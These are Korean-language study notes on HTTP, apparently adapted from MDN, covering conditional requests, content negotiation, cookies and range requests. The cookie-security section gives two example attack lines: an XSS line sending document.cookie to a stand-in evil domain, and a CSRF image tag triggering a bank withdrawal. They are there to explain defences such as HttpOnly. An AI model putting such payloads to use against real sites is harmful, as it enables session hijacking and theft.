- 사용자 에이전트가 두 리소스가 동일한 컨텐츠를 가지고 있는지만 알아내면 되는 경우에는 약한 검사기(Weak validator)가 사용되는데 덜 중요한 차이가 나는 경우에도 해당된다. 

## 4.2.1 Strong validator

- 강한 검사하는 리소스가 비교하려는 다른 리소스와 바이트 대 바이트로 동일한지를 보장하는데 그 특징이 있다. 
- 이것은 조건부 헤더에 대해서 의무적이며, 다른 헤더들에 대해서는 기본값이다. 
- 강한 검사는 매우 엄격하고 서버 레벨에서 보장하기는 매우 어려울 수 있으나, 때로는 성능의 손실을 감수하더라도 어떤 경우에도 데이터 무손실을 보장한다. 
- Last-Modified를 이용해 강력한 검사를 위한 유일한 식별자를 갖는 것은 꽤 어렵다. 
- 종종 이것은 리소스의 MD5 해시를 가지고 ETag를 사용하여 이루어진다. 

## 4.2.2 Weak validator

- 약한 검사는 문서의 내용이 유사한 경우 두 문서의 버전이 동일하다고 간주하는데에 강한 검사와의 차이가 있다. 
- 예를 들어, 기존의 페이지와 푸터 내의 날짜 혹은 광고만 다른 페이지가 있다고 가정할 때, 그 페이지는 강한 검사에서 다르다고 판단할 수 있지만, 약한 검사 내에서는 기존의 페이지와 동일하다고 간주될 수 있다. 
- 약한 검사를 만들어내는 etag 체계를 세우는 것은 페이지의 다른 요소들의 중요성 인지를 끌어들이는 순간부터 복잡해질 수 있으나, 그것은 캐싱 성능을 최적화하는데 매우 유용하다. 


# 4.2.3 conditional headers

# 4.2.3.1 If-Match

- If-Match HTTP request 헤더는 request conditional을 만든다. 
- GET, HEAD method에서 서버는 ETag와 일치하는 응답만을 보낸다. 
- PUT 헤더와 다른 non-safe method에서는 ETag와 일치하는 경우에만 리소스를 업로드한다. 
- 원격지 리소스의 ETag가 이 헤더에 나열된 것들과 일치한다면 성공이다. 기본적으로 etag에 'W/'가 접두사로 붙지 않았다면, 강한 검사가 될 것이다. 

~~~
// Syntax
If-Match: <etag_value>
If-Match: <etag_value>, <etag_value>, …
If-Match: *

// Example
If-Match: "bfc13a64729c4290ef5b2c2730249c88ca92d82d"
If-Match: W/"67ab43", "54ed21", "7892dd"
If-Match: *
~~~

# 4.2.3.2 If-None-Match

- 원격지 리소스의 ETag가 이 헤더에 나열된 것들과 일치하는 것이 없다면 성공이다. 기본적으로 etag에 'W/'가 접두사로 붙지 않았다면, 강한 검사가 될 것이다. 

# 4.2.3.3 If-Modified-Since

- 원격지의 리소스의 Last-Modified 날짜가 이 헤더 내에 주어진 것보다 좀 더 최근인 경우 성공이다.

~~~
// Syntax
If-Modified-Since: <day-name>, <day> <month> <year> <hour>:<minute>:<second> GMT

// Example
If-Modified-Since: Wed, 21 Oct 2015 07:28:00 GMT
~~~

- day-name : One of "Mon", "Tue", "Wed", "Thu", "Fri", "Sat", or "Sun" (case-sensitive).
- day : 2 digit day number, e.g. "04" or "23".
- month : One of "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec" (case sensitive).
- year : 4 digit year number, e.g. "1990" or "2016".
- hour : 2 digit hour number, e.g. "09" or "23".
- minute : 2 digit minute number, e.g. "04" or "59".
- second :  2 digit second number, e.g. "04" or "59".
- GMT : 그리니치 표준시 (Greenwich Mean Time). HTTP dates are always expressed in GMT, never in local time.

# 4.2.3.4 If-Unmodified-Since

- 원격지의 리소스의 Last-Modified 날짜가 이 헤더 내에 주어진 것보다 더 오래됐거나 같다면 성공이다. 


# 4.2.3.5 If-Range

- 범위 요청을 조건적으로 만든다. 
- 만약 조건이 만족된다면, 범위 요청은 처리되어 서버에서 206 Partial Content 응답을 적절한 바디를 포함하여 보낼 것이다. 
- 만약 조건을 만족하지 못한다면, 200 OK 상태 코드가 전체 리소스와 함께 돌아올 것이다. 
- 이 헤더는 Last-Modified 유효 검사자, 또는 ETag와도 함께 사용될 수 있지만, 동시에는 사용할 수 없다. 
- 가장 많은 사용 예로 다운로드를 재개할 때, 저장된 리소스가 마지막 조각을 다운받은 후 수정되었는지 확인하기 위하여 사용한다. 

~~~
// Syntax
If-Range: <day-name>, <day> <month> <year> <hour>:<minute>:<second> GMT
If-Range: <etag>
// Example
If-Range: Wed, 21 Oct 2015 07:28:00 GMT
~~~

## 4.3 Use cases

## 4.3.1 캐시 갱신

- 조건부 요청의 가장 일반적인 케이스는 캐시를 갱신하는 것이다. 
- 비어 있는 캐시를 가지고 있거나 혹은 캐시를 가지고 있지 않은 경우, 요청된 리소스는 200 OK의 상태로 회신된다. 
- 리소스와 함께 검사기가 헤더 내에 전송된다. 예를 들어, Last-Modified와 ETag가 전송되지만, 그들 중 하나만 전송될 수 있다. 
- 이 검사기들은 (모든 헤더처럼) 해당 리소스와 함께 캐시되며 캐시가 만료되었을 때 조건부 요청을 만들어 내는데 사용될 것이다. 
- 캐시가 만료되지 않았을때, 어떤 요청도 발급되지 않는다. 
- 그러나 만료된다면 Cache-Control 헤더에 의해 제어되며, 클라이언트는 캐시된 값을 직접 사용하지 많으며 If-Modified-Since와 If-Match 헤더의 파라미터로써 사용되는 검사기 값을 이용해 조건부 요청을 전송하게 된다. 
- 리소스가 변경되지 않았다면, 서버는 304 Not Modified 응답을 회신하게 된는데, 이는 캐시를 다시 신선한 것으로 만들어주며 클라이언트는 그 캐시된 리소스를 사용하게 된다. 
- 비록 어떤 리소스를 소비하는 응답/요청 라운드 트립이 있다고 하더라도, 연결을 통해 가시 전체 리소스를 전송하는 것보다는 더 효율적이다. 
- 리소스가 변경되었다면, 요청이 조건부가 아니었고 클라이언트가 이 새로운 리소스를 사용하는(그리고 그것을 캐시하는) 경우처럼, 서버는 리소스의 새로운 버전과 함께, 200 OK 응답을 회신한다. 

## 4.3.2 Integrity of a patial download

- 파일들의 부분적인 다운로드는 이전 동작을 계속하게 이어주는 HTTP의 기능으로, 이미 받아놓은 정보를 유지함으로써 대역폭과 시간을 절약해준다. 
- 부분적인 다운로드를 지원하는 서버는 Accept-Ranges 헤더를 보냄으로써 이를 알린다. 
- 그렇게 되면, 클라이언트는 아직 전송받지 못한 범위와 함께 Ranges을 전송하여 다운로드를 이어갈 수 있다. 
- 이 원칙은 간단한데, 한 가지 잠재적인 문제점이 있다. 
- 다운로드된 리소스가 두 개의 다룬로드 사이에 수정될 경우, 수신받던 범위는 리소스의 두 개의 서로 다른 버전과 상응하게 될 것이며 최종적인 문서는 오염되게 될 것이다. 
- 이것을 방지하기 위해 조건부 요청이 사용된다. 
- 범위에 대해, 이를 할 수 있는 두 가지 방법이 존재한다. 
- 좀 더 유연한 방법은 If-Modified-Since와 If-Match를 사용하는 것이며 서버는 전제 조건이 실패할 경우 오류를 반환하게 된다. 
- 그러면 클라이언트는 다운로드를 처음부터 다시 시작한다. 
- 이 방법이 동작하긴 하지만, 문서가 변경된 경우 추가적인 응답/요청 교환을 필요로 한다. 
- 이것은 성능을 감소시키는데 HTTP는 이것을 피하기 위한 If-Range 헤더를 가지고 있다.
- 이 해결책이 좀 더 효과적이긴 한데 약간은 덜 유연하다.(오로지 etag만이 조건 내에서 사용될 수 있다.)

## 4.3.3 Avoiding the lost update problem with optimistic locking

- 웹 애플리케이션에서 일반적인 동작은 원격 문서를 갱신하는 것이다. 
- 이것은 어떤 파일 시스템 혹은 소스 제어 애플리케이션에서든 매우 흔한 일인데, 원격 리소스 저장을 허용하는 어떤 애플리케이션이든 그러한 매커니즘을 필요로 한다. 
- 위키나 다른 CMS와 같은 일반적인 웹 사이트들도 그런 요구사항을 지니고 있다. 
- PUT 메서드를 이용해 구현할 수 있다. 
- 먼저 클라이언트는 원본 파일을 읽어들인 후 그것을 수정하고 최종적으로 서버로 수정된 파일을 내보낸다. 
- 불행하게도, 계정의 동시실행 내로 들어가자마자 약간 예상치 못한 결과를 맞이하게 될 것이다. 
- 하나의 클라이언트가 리소스의 새로운 복사본을 지역적으로 수정하고 있는 동안에도, 두번째 클라이언트가 동일한 리소스를 내려받고 자신의 영역 내에서 동일한 작업을 할 수 있다. 
- 그렇게 되면 문제가 발생한다. 
- 그들이 다시 커밋하게 되었을 때, 전송할 첫번째 클라이언트의 수정본은 다음의 전송에 의해 폐기되는데, 이는 두번째 클라이언트가 새로운 변경 사항을 알고 있지 못하기 때문이다. 
- 어떤 것이 받아들려질지에 대한 결정은 다른 쪽에게 알려지지 않겠지만, 어떤 클라이언트의 변경 사항이 유지될 지는 그들이 커밋을 하는 시점, 클라이언트 그리고 서버의 성능에 의해서도 달라지며, 클라이언트에서 문서를 수정하는 속도에 의해 달라지게 될 것이다. 
- 받아들여진 클라이언트의 변경 사항으로 모두 변경될 것이다. 
- 이것을 경쟁 상태(race condition)라고 감지하고 디버깅이 어려운 불확실한 동작을 유발한다. 
- 두 클라이언트 중 하나를 불편하게 만들지 않고는 이를 해결할 수 있는 방법은 없다. 
- 그러나 업데이트 손실과 경쟁 상태는 피하게 된다. 
- 우리는 예측 가능한 결과와 클라이언트의 변경 사항이 거절된 경우 클라이언트가 그것을 알 수 있길 원한다. 
- 조건부 요청은 (대부분 위키 혹은 소스 제어 시스템에 의해 사용되는) 최적화 잠금 알고리즘을 구현할 수 있도록 한다. 이런 아이디어는 모든 클라이언트들이 리소스의 복사본들을 가지고 로컬에서 그것을 수정하며 첫번째 클라이언트가 그 수정된 내용을 성공적으로 제출하고 나서 이제는 이전 버전이 된 리소스가 거절되도록 하여 모든 업데이트가 순차적으로 이루어질 수 있도록 하여 동시성을 제어할 수 있도록 해준다.
- 이것은 If-Match 혹은 If-Unmodified-Since 헤더를 사용해 구현하게 된다. 
- etag가 원본 파일과 일치하지 않거나 혹은 파일을 수신한 이후에 파일이 수정된 경우, 해당 변경 사항은 단순히 412 Precondition Failed 오류와 함께 거정될 것이다. 
- 그런 뒤에 오류를 다루는 것은 클라이언트에게 달려있으며, 현재 가장 최신의 버전으로부터 다시 시작하도록 사람에게 알려주는 방법 혹은 "diff"를 보여주고 변경된 내용을 유지하도록 선택할 수 있게 사람에게 도움을 주는 방법 등을 이용할 수 있다. 

## 4.3.4 Dealing with the first upload of a resource

- 리소스의 첫번째 업로드는 이전 예제의 엣지 케이스이다. 
- 리소스 업데이트의 어떤 경우든지, 두 클라이언트가 업데이트를 동시에(혹은 거의 같은 시점에) 실행하려고 하는 경우는 경쟁 상태의 대상이다. 
- 이를 방지하기 위해, 조건부 요청을 사용할 수 있다. 
- 어떤 etag든지 나타내는 '*'라고 하는 특별한 값을 If-None-Match에 추가하여, 리소스가 이전에 존재하지 않은 경우에만 요청이 성공하게 할 수 있다. 
- If-None-Match는 HTTP/1.1 호환 서버에서만 동작한다. 서버가 호환되는지는 HEAD 메소드 요청을 통해 체크할 수 있다. 


## 5. Content negotiation

- HTTP에서, Content negotiation이란 동일한 URI에서 리소스의 서로 다른 버전을 서브하기 위해 사용되는 메커니즘이다. 
- 사용자 에이전트가 사용자에게 제일 잘 맞는 것이 무엇인지(예를 들어, 문서의 언어, 이미지 포맷 호맷 혹은 컨텐츠 인코딩에 있어 어떤 것이 적절한지)를 명시할 수 있다. 

## 5.1 principles of content negotiation

- 우리는 특정 문서를 리소스라고 부른다. 
- 클라이언트가 리소스를 내려받길 원할 경우, 그것의 URL을 사용하여 요청한다. 
- 서버는 리소스가 제공하는 여러 변형들 중 하나를 선택하기 위해 이런 URL을 사용하며 (각각의 변형을 프레젠테이션이라고 부른다.) 클라이언트에게 해당 리소스의 특정 프레젠테이션을 반환한다. 
- 프레젠테이션들에 더해, 전체 리소스들은 특유의 URL을 가진다. 
- 리소스가 호출됐을 때 특정 프레젠테이션을 선택하는 방법은 컨텐츠 협상에 의해 결정되며 클라이언트와 서버 간의 협상에는 몇가지 방식이 존재한다. 
- 가장 잘 맞는 프레젠테이션의 결정은 다음 두 개의 매커니즘 중 하나를 통해 이루어진다. 
    - 클라이언트가 보내는 특정 HTTP 헤더를 이용하는 방법(서버 주도 협상 혹은 주도적인 협상)으로, 특정 종류의 리소스에 대한 표준 협상 방법이다. 
    - 서버에 의해 전달되는 300(다중 선택) 혹은 406(허용되지 않음) HTTP 응답 코드를 이용하는 방법(에이전트 주도 협상 혹은 리액티브 현상)으로, 폴백 메커니즘으로써 사용된다. 

## 5.2 서버 주도 컨텐츠 협상

- 서버주도 컨텐츠 협상 혹은 주도적인 협상에 있어서, 브라우저(혹은 사용자 에이전트라면 어떤 다른 종류든지)는 URL을 이용해 몇 개의 HTTP 헤더를 전송한다. 
- 이런 헤더들은 사용자의 우선적인 선택을 나타낸다. 
- 서버는 그것들을 힌트로써 사용하며 내부 알고리즘은 클라이언트로 서브하기 위한 최선의 컨텐츠를 선택하게 된다. 

- HTTP/1.1 표준은 서버 주도 협상을 시작하는 표준 헤더 목록(Accept, Accept-Charset, Accept-Encoding, Accept-Language)을 정의하고 있다. 
- 엄밀히 말하자면 User-Agent가 리스트 내에 없긴 하지만, 좋은 관례가 아니라고 판된될지라도, 해당 헤더는 때때로 요청된 리소스의 특정 프레젠테이션을 전송하는데 사용하되기도 한다. 
- 서버는 실제로 컨텐츠 협상에 있어 어떤 헤더가 사용될 지 (더 엄밀히 말하자면 연관된 응답 헤더) 가리키기 위해 Vary 헤더를 사용하므로 캐시는 최적으로 동작하게 된다. 

- 이것과 더불어, 클라이언트 힌트라고 부르는 헤더들을 이용 가능한 레더 목록에 추가하려는 실험적인 제안도 존재한다. 
- 클라이언트 힌트는 사용자 에이전트가 실행 중인 기기의 종류가 무엇인지를 알려준다(예를 들어, 데스크톱 컴퓨터인지 모바일 기기인지)

- 서버 주도 컨텐츠 협상이 리소스의 특정 프레젠테이션에 동의하기 위한 가장 일반적인 방법이다. 하지만 몇 가지 결점을 가지고 있다. 
    - 서버는 브라우저에 대한 전체적인 지식을 가지고 있지 않다. 클라이언트 힌트 확장이 있더라도, 서버는 브라우저의 수용 능력에 대한 완벽한 정보를 가지고 있진 않는다. 클라이언트가 선택하는 리액티브 컨텐츠 협상과는 다르게, 서버 선택은 다소 임의적이다. 
    - 클라이언트에 의한 정보는 상당히 장황하며 사생활 침해에 대한 위협을 가지고 있다. 
    - 주어진 리소스의 몇몇 프레젠테이션이 전송되므로, 샤드된 캐시들은 덜 효율적이며 서버 구현은 좀 더 복잡해진다. 

## 5.2.1 Accept 헤더

- Accept 헤더는 에이전트가 처리하고자 하는 미디어 리소스의 MIME 타입을 나열한다. 
- 그것은 MIME 타입을 쉼표로 구분한 목록이며, 각각 품질 인자와 함께 나열되어 있으며, 다른 MIME 타입 사이의 상대적인 선호도를 나타내는 파라미터이기도 한다. 
- Accept 헤더는 브라우저나 다른 에이전트에 의해 정의되며 HTML 페이지 혹은 이미지나 비디오 또는 스크립트들을 가져오는 것처럼, 컨텍스트에 따라 다양해질 수 있다. 
- 주소창에 입력된 문서를 내려 받을 때와 <img>,<video> 혹은 <audio> 엘리먼트를 통해 링크된 요소를 내려받을 때가 다르다. 
- 브라우저는 그들이 판단하기에 가장 적절한 헤더의 값을 마음껏 사용할 것이다. 

## 5.2.2 Accept-Encoding 헤더

- 수용 가능한 (압축을 지원하는) 컨텐츠 인코딩을 정의한다.
- 값은 인코딩 값의 우선 순위를 가리키는 q 인자 목록이다. 
- 기본값 identity는 가장 낮은 우선 순위이다. 
- HTTP 메시지 압축은 웹 사이트의 성능을 높이는 가장 중요한 방법이며, 전송 데이터의 크기를 줄여주며 가용할 수 있는 대역폭을 더 좋은 상태로 만들어준다. 
- 브라우저는 항상 이 헤더를 전송하며 서버는 그것을 받아들이고 압축을 사용하도록 구성되어 있어야 한다. 

## 5.2.3 Accept-Language 헤더

- 사용자가 선호하는 언어를 가리키는데 사용된다. 
- 기본 값은 사용자 에이전트의 그래픽 인터페이스 언어와 관련하여 설되지만, 대부분의 브라우저들은 다른 언어 설정을 허용한다. 
- 구성 기반의 엔트로피의 증가로, 사용자 판별에 수정된 값을 사용할 수 없고, 그것을 수정하는 것은 권장되지 않으며 웹 사이트는 사용자의 실제 요구를 반영하기 위해 이 값을 신뢰할 수 없다. 
- 이 헤더를 통해 감지된 언어가 좋지 않은 사용자 경험을 유발할 수도 있으므로 사이트 설계자는 해당 헤더 값을 맹신해서는 안된다. 
    - 사이트 설계자들은 서버에서 선택한 언어가 아닌 다른 언어를 선택할 수 있는 방법을 제공해야 한다. 예를 들자면 사이트 상에 언어 메뉴를 제공하는 것이다. 대부분의 사용자 에이전트들을 사용자 인터페이스 언어에서 차용된 값을 Accept-Language 헤더의 기본값으로 제공하는데, 최종 사용자는, 언어 변경을 할 수 없을 수 있다. 
    - 사용자가 서버가 선택한 언어를 재정의하고 나면, 사이트는 더 이상 언어 감지를 사용해서는 안되며 명시적으로 선택된 언어를 인정해야 한다. 다시 말하자면, 사이트 엔트리 페이지에서만 이 헤더를 사용하여 적당한 언어를 선택해야 한다. 

## 5.3 Vary 응답 헤더

- 이전에 봤던 클라이언트에 의해 전송되는 Accept-* 헤더들과 달리, Vary HTTP 헤더는 웹 서버에 의한 응답 내로 전달된다. 
- 이 헤더는 서버 주도 컨텐츠 협상의 과정 중에 서버에 의해 사용되는 헤더들의 목록을 나타낸다. 
- 이 헤더는 결정 기준 캐시를 알리기 위해 필요하므로 사용자에게 잘못된 컨텐츠를 제공하는 일을 방지하는 동안 캐시가 가동되게 허용하도록 캐시를 복제할 수 있따. 
- 특별한 값인 '*'는 서버 주도 컨텐츠 협상이 적합한 컨텐츠 선택을 위해 헤더로 전달되지 않은 정보도 사용한다는 것을 의미한다. 


## 6. HTTP Cookie

- HTTP 쿠키(웹 쿠키, 브라우저 쿠키)는 서버가 사용자의 웹 브라우저에 전송하는 작은 데이터 조각이다. 
- 브라우저는 그 데이터 조각들을 저장 할 수 있고 동일한 서버로 다음 요청 시 함께 전송할 것이다. 
- 일반적으로, 동일한 브라우저에서 다음 두 요청이 들어오는 것을 말한다. 
- 예를 들자면, 유저 로그인 상태 유지, 쿠키가 없는(stateless) HTTP 프로토콜에서 상태 기반 정보를 기억한다. 
- 쿠키는 주로 세가지 목적을 위해 사용된다. 
    - 세션 관리(Session management)
    Logins, shopping carts, game scores, or anything else the server should remember
    - 개인화(Personalization)
    User preferences, themes, and other settings
    - 트래킹(Tracking)
    Recording and analyzing user behavior

- 쿠키는 일반적인 클라이언트 측 스토리지로도 사용된 적이 있었다. 
- 쿠키가 클라이언트 측에 데이터를 저장하는 유일한 방법이었을 때는 적당한 방법이었지만, 요즘에는 modern storage APIs를 선택하는 것을 권장한다. 
- 쿠키는 모든 요청과 함께 전송되기 때문에 성능 상의 부담이 될 수 있다. 
- 클라이언트 스토리지를 위한 Modern APIs는 웹 스토리지 API(localStorage와 sessionStorage) 그리고 IndexedDB이다. 


## 6.1 쿠키 만들기

- HTTP 요청을 수신할 때, 서버는 응답과 함께 Set-Cookie 헤더를 전송한다. 
- 쿠키는 보통 브라우저에 의해 저장되며, 그 후 쿠키는 같은 서버에 의해 만들어진 요청(Request)들의 Cookie HTTP 헤더 안에 포함되어 전송된다. 
- 만료일 혹은 지속시간도 명시될 수 있고, 만료된 쿠키는 더이상 보내지지 않는다. 
- 추가적으로, 특정 도메인 혹은 경로 제한을 설정할 수 있으며 이는 쿠키가 보내지는 것을 제한할 수 있다. 

## 6.1.1 Set-Cookie 그리고 Cookie 헤더

- Set-Cookie HTTP 응답 헤더는 서버로부터 사용자 에이전트로 전송된다. 간단한 쿠기는 다음과 같이 설정될 수 있다. 

~~~
Set-Cookie: <cookie-name>=<cookie-value>

// response example
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

// request example
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
~~~

## 6.1.2 세션 쿠키

- 위에서 생성된 쿠키는 세션 쿠키이다. 
- 클라이언트가 종료되면 삭제될 것이다. 
- 이유는 Expires 혹은 Max-Age를 몇시하지 않았기 때문이다. 
- 그러나 웹 브라우저는 세션 복수를 할 수 있으며, 이 기능은 브라우저가 결코 닫힌 적이 없던 것처럼 대부분의 세션 쿠키들을 영속적인 것으로 만든다 

## 6.1.3 영속적인 쿠키

- 클라이언트가 닫힐 때 만료되는 대신에, 영속적인 쿠키는 명시된 날짜(Expires)에 만료되거나 혹은 명시한 기간(Max-Age) 이후에 만료된다.

~~~
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
~~~

## 6.1.4 Secure과 HttpOnly 쿠키

- Secure 쿠키는 HTTPS 프로토콜 상에서 암호화된(encrypted) 요청일 경우에만 전송된다. 
- 하지만 Secure일지라도 민감한 정보는 절대 쿠키에 저장되면 안된다. 
- 본질적으로 안전하지 않고 이 플래그가 당신에게 실질적인 보안(real protection)를 제공하지 않기 때문이다. 
- 크롬 52 혹은 파이어폭스 52로 시작한다면, 안전하지 않은 사이트(http:)는 쿠키에 Secure 설정을 지시할 수 없다. 
- Cross-site 스크립팅(XSS) 공격을 방지하기 위해, HttpOnly 쿠키는 JavaScript의 Document.cookie API에 접근할 수 없다. 
- 그들은 서버에 전송되기만 한다. 
- 예를 들어, 서버 쪽에서 지속되고 있는 세션의 쿠키는 JavaScript를 사용할 필요성이 없기 때문에 HttpOnly플래그가 설정될 것이다. 

~~~
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
~~~

## 6.1.5 쿠키의 스코프

- Domain 그리고 Path 디렉티브는 쿠키의 스코프를 정의한다. 
- 어떤 URL을 쿠키가 보내야 하는지.
- Domain은 쿠키가 전송되게 될 호스트들을 명시한다. 
- 만약 명시되지 않는다면, (서브 도메인은 포함되지 않는) 현재 문서 위치의 호스트 일부를 기본값으로 한다. 
- 도메인이 명시되면 서브 도메인들은 항상 포함된다. 
- 만약 Domain=mozilla.org이 설정되면, 쿠키들은 developer.mozilla.org와 같은 서브도메인 상에 포함되게 된다. 
- 만약 Path=/docs이 설정되면 다음의 경로들은 모두 매치될 것이다. 
- /docs, /docs/Web/, /docs/Web/HTTP

## 6.1.6 Document.cookie를 사용한 자바스크립트 접근

- 새로운 쿠키들은 Document.cookie를 사용해 만들어질 수도 있으며, HttpOnly 플래그가 설정되지 않은 경우 기본의 쿠키들은 자바스크립트로부터 잘 접근될 수 있다. 

~~~
document.cookie = "yummy_cookie=choco"; 
document.cookie = "tasty_cookie=strawberry"; 
console.log(document.cookie); 
// logs "yummy_cookie=choco; tasty_cookie=strawberry"
~~~

## 6.2 보안

- 기밀 혹은 민감한 정보는 전체 메커니즘이 본질적으로 위험하기 때문에 HTTP 쿠키 내에 저장되거나 전송되어서는 안된다. 

## 6.2.1 세션 하이재킹과 XSS

- 쿠키는 대개 웹 애플리케이션에서 사용자와 그들의 인증된 세션을 식별하기 위해 사용되곤 한다. 
- 그래서 쿠키를 가로채는 것은 인증된 사용자의 세션 하이재킹으로 이어질 수 있다. 
- 쿠키를 가로채는 일반적인 방법은 소셜 공학 사용 혹은 애플리케이션 내 XSS 취약점을 이용하는 것을 포함한다. 
~~~
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
~~~

- HttpOnly 쿠키 속성은 자바스크립트를 통해 쿠키 값에 접근하는 것을 막아 이런 공격을 누그러뜨리는데 도움을 줄 수 있다. 

## 6.2.2 Cross-site 요청 위조(CSRF)

- 당신의 은행 서버에 돈을 입금하는 실제 요청 대신에, 실제로는 이미지가 아닌 이미지를 포함시키고 있다. 

~~~
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
~~~

- 이제 당신이 당신의 은행 계좌에 로그인하고 당신의 쿠키가 여전히 유효하다면(그리고 별 다른 검증 절차가 존재하지 않는다면), 해당 이미지를 포함하고 있는 HTML을 로드하자마자 돈이 송금될 것이다. 이런 일들을 방지하기 위한 몇 가지 기술이 있다.
    - XSS와 마찬가지로 입력 필터링은 중요한 문제이다. 
    - 모든 민감한 동작에 필수로 요구되는 확인 절차가 할상 수행되도록 한다. 
    - 민감한 동작에 사용되는 쿠키는 짧은 수명만 갖도록 한다. 

## 6.3 트래킹과 프라이버시

## 6.3.1 서드파티 쿠키

- 쿠키는 그와 관련된 도메인을 가진다. 
- 이 도메인이 당신이 현재 보고 있는 페이지의 도메인과 동일하다면, 그 쿠키는 퍼스트 파티 쿠키라고 불린다. 
- 만약 도메인이 다르다면, 서드파티 쿠키라고 부른다. 
- 퍼스트파티 쿠키가 그것을 설정한 서버에만 전송되는데 반해, 웹 페이지는 다른 도메인의 서버 상에 저장된 (광고 배너와 같은) 이미지 혹은 컴포넌트를 포함할 수도 있다. 
- 이러한 서드파티 컴포넌트를 통해 전송되는 쿠키들을 서드파티 쿠키라고 부르며 웹을 통한 공과와 트래킹에 주로 사용된다. 
- 대부분의 브라우저들은 기본적으로 서드파티 쿠키를 따르지만, 그것을 차단하는데 이용되는 애드온들이 있다. 
- 당신이 만약 서드파티 쿠키를 공개하고 있지 않다면, 쿠키 사용이 밝혀질 경우 소비자 신뢰를 잃을 수 있다. 
- (프라이버시 정책과 같은) 명백한 공개는 쿠키 발견과 관련된 모든 부정적인 효과를 없애는 경향이 있다. 
- 어떤 국가들은 쿠키에 관한 법률도 가지고 있다. 

## 7. HTTP range requests

- HTTP 범위 요청은 HTTP의 일정 부분만 서버에서 클라이언트로 보내도록 허락하는 것이다. 
- 부분 요청은 대형 미디어나 파일 다운로드 도중 일시정지와 다시 시작 기능에 유용하다.

## 7.1 서버가 부분 요청을 지원하는지 확인

- 서버가 range 요청을 지원한다면, HTTP 응답에 Accept-Ranges 헤더가 존재 할 것이다.
- 이는 예를 들면 HEAD를 cURL에서 요청함으로 확인할 수 있다. 

~~~
curl -I http://i.imgur.com/z4d4kWk.jpg

HTTP/1.1 200 OK
...
Accept-Ranges: bytes
Content-Length: 146515
~~~

- 이 응답에서, Accept-Ranges: bytes는 바이트가 범위 요청에서 최소 단위로 사용될 수 있음을 알려준다. 
- 여기에서 Content-Length 헤더 역시 이미지를 얻기 위한 최대 크기를 할 수 있어 유용하다. 
- 만약 사이트가 Accept-Ranges헤더를 빠트린다면, 분할 요청을 지원하지 않는 것으로 생각된다. 
- 일부 사이트는 명확하게 "none"을 값으로 보내 지원하지 않는 것을 알려준다. 
- 일부 어플리케이션에서는 다운로드 매니저에게 일시정지 버튼을 없애버리는 경우가 있다. 

~~~
curl -I https://www.youtube.com/watch?v=EwTZ2xpQwpA

HTTP/1.1 200 OK
...
Accept-Ranges: none
~~~

## 7.2 서버의 특정 범위를 요청

- 만약 서버가 범위 요청을 지원한다면, Range 헤더를 사용하여 요청할 수 있다. 
- 이는 서버에서 문서의 일부분만 돌려주면 된다는 것을 알 수 있게 해준다. 

## 7.2.1 단일 부분 범위

- 우리는 리소스의 단일 부분에 대해서만 요청할 수 있다. 
- 역시 cURL을 사용하여 테스트 한다. 
- "-H"는 HTTP 요청의 헤더에 추가된다는 옵션이며, 이 경우에는 Range 헤더로 첫 1024 바이트를 요청한다. 

~~~
curl http://i.imgur.com/z4d4kWk.jpg -i -H "Range: bytes=0-1023"
~~~

- 요청은 다음처럼 보여진다. 

~~~
GET /z4d4kWk.jpg HTTP/1.1
Host: i.imgur.com
Range: bytes=0-1023
~~~

- 서버에서 206 Partial Content 상태로 응답한다.

~~~
HTTP/1.1 206 Partial Content
Content-Range: bytes 0-1023/146515
Content-Length: 1024
...
(binary content)
~~~

## 7.2.2 다중 부분 범위

- Range 헤더는 문서의 여러 부분 역시 다중 범위 요청을 통해 한번에 가져올 수 있다. 
- 범위는 콤마로 나누어진다. 

~~~
curl http://www.example.com -i -H "Range: bytes=0-50, 100-150"
~~~

- 서버는 206 Partial Content 상태로 응답하며 'Content-Type : multipart/byteranges; boundary=3d6b6a416f9b5' 는 다중 부분 바이트 범위를 알려준다. 
- 각 부분은 고유의 Content-Type과 Content-Range 영역을 가지고 있으며, 경계를 나누는 문자열인 경계 파라미터를 필요로 한다. 

~~~
HTTP/1.1 206 Partial Content
Content-Type: multipart/byteranges; boundary=3d6b6a416f9b5
Content-Length: 282

--3d6b6a416f9b5
Content-Type: text/html
Content-Range: bytes 0-50/1270

<!doctype html>
<html>
<head>
    <title>Example Do
--3d6b6a416f9b5
Content-Type: text/html
Content-Range: bytes 100-150/1270

eta http-equiv="Content-type" content="text/html; c
--3d6b6a416f9b5--
~~~

## 7.2.3 조건 분할 요청

- 리소스에 대해 추가 요청을 재개하기에 앞서, 마지막에 분할된 데이터를 받은 이후 저장된 리소스가 수정되지는 않았는지 확인해야 한다. 
- If-Range HTTP 요청 헤더는 범위 요청에 조건을 만든다. 
- 만약 조건이 만족하면, 분할 요청은 서버에서 처리되어 206 Partial Content 응답과 함께 적절한 바디와 돌아올 것이다. 
- 만약 조건을 만족하지 못한다면, 전체 리소스가 200 OK 상태로 보내진다. 
- 이 헤더는 Last-Modified 확인자나 ETag와 함께 사용될 수 있지만, 동시에는 안된다. 

~~~
If-Range: Wed, 21 Oct 2015 07:28:00 GMT
~~~

## 7.3 분할 요청 응답

- 범위 요청을 처리할 때, 다음의 3가지 상태가 있다. 
    - 성공적으로 보내질 경우에는, 206 Partial Content 상태가 서버에서 돌아온다. 
    - 범위를 벗어난 경우(범위 값이 리소스 크기를 벗어났을 때), 서버는 416 Requested Range Not Satisfiable 상태로 답한다. 
    - 범위 요청을 지원하지 않는 경우, 서버는 200 OK 상태를 돌려보낸다. 

## 7.4 Chunked Transfer-Encoding과 비교

- Transfer-Encoding 헤더는 chunked encoding 또한 지원하며, 이는 대용량 데이터를 클라이언트에 보낼 때와 요청이 모두 처리되기 전까지 총 크기를 알 수 없을 때 유용하다. 
- 서버는 데이터를 클라이언트에 응답 버퍼링 없이 즉시 보내거나, 정확한 길이를 측정하여 지연 시간을 향상시킨다. 
